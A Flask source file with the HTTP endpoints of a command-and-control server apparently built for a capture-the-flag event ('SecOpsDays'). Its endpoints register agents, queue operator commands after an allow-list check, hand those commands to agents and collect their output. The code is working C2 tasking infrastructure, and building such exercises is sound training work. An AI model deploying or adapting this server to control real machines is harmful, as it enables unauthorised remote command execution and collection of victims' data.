"""Endpoints HTTP del C2 server (Flask Blueprint)."""
import logging

from flask import Blueprint, jsonify, render_template, request

import config
from models import is_command_allowed, require_token, store

log = logging.getLogger("c2")

api = Blueprint("api", __name__)


@api.route("/", methods=["GET"])
def index():
    """Raíz: info básica del C2 (sin auth)."""
    return jsonify({
        "name": "C2 CTF SecOpsDays",
        "nonce": config.NONCE,
        "status": "running",
        "endpoints": {
            "health": "/health",
            "dashboard": "/dashboard",
            "register": "POST /register",
            "heartbeat": "POST /heartbeat",
            "task": "GET|POST /task/<agent_id>",
            "result": "POST /result/<agent_id>",
            "agents": "GET /agents",
            "results": "GET /results/<agent_id>",
        },
    })


@api.route("/dashboard", methods=["GET"])
def dashboard():
    """Dashboard visual para el operador (sin auth para CTF)."""
    return render_template("index.html", nonce=config.NONCE)


@api.route("/health", methods=["GET"])
def health():
    """Healthcheck sin autenticación."""
    return jsonify({"status": "ok"})


@api.route("/register", methods=["POST"])
@require_token
def register():
    info = request.get_json(silent=True) or {}
    agent_id = store.register(info, agent_id=info.get("agent_id"))
    log.info("REGISTER agent=%s host=%s user=%s ip=%s",
             agent_id, info.get("hostname"), info.get("username"), info.get("ip"))
    return jsonify({
        "agent_id": agent_id,
        "heartbeat_interval": config.HEARTBEAT_INTERVAL,
    })


@api.route("/heartbeat", methods=["POST"])
@require_token
def heartbeat():
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id")
    if store.heartbeat(agent_id):
        log.info("HEARTBEAT agent=%s", agent_id)
        return jsonify({"status": "ok"})
    log.warning("HEARTBEAT desconocido agent=%s", agent_id)
    return jsonify({"error": "unknown agent"}), 404


@api.route("/task/<agent_id>", methods=["GET"])
@require_token
def get_task(agent_id):
    task = store.next_task(agent_id)
    if task:
        log.info("TASK dispatch agent=%s task=%s cmd=%r",
                 agent_id, task["task_id"], task["command"])
        return jsonify({"task": task})
    return jsonify({"task": None})


@api.route("/task/<agent_id>", methods=["POST"])
@require_token
def enqueue_task(agent_id):
    """Endpoint de operador: encola una tarea para un agente."""
    data = request.get_json(silent=True) or {}
    command = data.get("command", "")
    allowed, reason = is_command_allowed(command)
    if not allowed:
        log.warning("TASK rechazada agent=%s cmd=%r motivo=%s",
                    agent_id, command, reason)
        return jsonify({"error": "comando no permitido", "reason": reason}), 400
    task = store.add_task(agent_id, command)
    if task is None:
        return jsonify({"error": "unknown agent"}), 404
    log.info("TASK encolada agent=%s task=%s cmd=%r",
             agent_id, task["task_id"], command)
    return jsonify({"task": task}), 201


@api.route("/result/<agent_id>", methods=["POST"])
@require_token
def post_result(agent_id):
    data = request.get_json(silent=True) or {}
    task_id = data.get("task_id")
    output = data.get("output", "")
    store.save_result(agent_id, task_id, output)
    log.info("RESULT agent=%s task=%s bytes=%d", agent_id, task_id, len(output))
    return jsonify({"status": "ok"})


@api.route("/agents", methods=["GET"])
@require_token
def list_agents():
    return jsonify({
        "nonce": config.NONCE,
        "count": len(store.agents),
        "agents": store.list_agents(),
    })


@api.route("/results/<agent_id>", methods=["GET"])
@require_token
def list_results(agent_id):
    return jsonify({"results": store.results_for(agent_id)})
